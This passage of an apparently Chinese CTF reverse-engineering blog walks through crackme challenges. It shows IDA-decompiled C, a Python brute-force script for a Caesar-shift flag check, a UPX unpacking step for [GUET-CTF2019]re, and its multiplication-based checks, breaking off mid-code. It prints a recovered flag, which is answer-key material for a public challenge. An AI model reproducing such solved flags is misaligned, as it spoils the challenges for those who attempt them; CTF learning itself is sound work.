punctuation">;</span>  result <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token string">'A'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> v3<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token string">'C'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> v4<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token string">'T'</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> v5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token string">'F'</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          result <span class="token operator">=</span> v6<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token string">'&#123;'</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            result <span class="token operator">=</span> v11<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">==</span> <span class="token string">'&#125;'</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v12<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token punctuation">)</span>                  <span class="token keyword">return</span> result<span class="token punctuation">;</span>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              result <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到只是一个简单的算法，直接得脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> stringv12 <span class="token operator">=</span> <span class="token string">'Qsw3sj_lz4_Ujw@l'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>  <span class="token comment"># ascii表上有127个字符，一个一个试吧</span>        j <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        x <span class="token operator">=</span> j        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;Cae3ar_th4_Gre@t&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的这里</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>    <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的第一个if判断的是大写字母，第二个判断的是是否是小写字母。所以才有了我们的解题的flag。</p><p>这里我们把<code>*((char *)v1 + *(_DWORD *)&amp;v12[17])</code>这个整体看作<code>ord(j)</code>了，在逆向中，我们也常常这样将一个整体当成一个变量对待。</p><h3 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h3><p><strong>TAG:Z3脚本、UPX脱壳</strong></p><p>先拖进IDA64里面什么都没有发现，搜索一下字符串发现还是啥都没有，使用前几天刚更新的exeinfo2021查一下壳。</p><p><img src="/2021/05/28/CTF/image-20210607132422766.png" alt></p><pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\re<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接使用上方的命令脱一下壳。</p><p><img src="/2021/05/28/CTF/image-20210607132642504.png" alt></p><p>对上方的关键的字符串进行一下跟踪，追到下面的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_400E28</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">int</span> a5<span class="token punctuation">,</span> <span class="token keyword">int</span> a6<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er8</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// er9</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v12 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40F950</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"input your flag:"</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> a6<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40FA80</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v12 <span class="token punctuation">)</span>    <span class="token function">sub_443550</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再追踪一下<code>sub_4009AE</code>这个函数，发现里面的C代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> <span class="token operator">*</span>a1 <span class="token operator">!=</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token 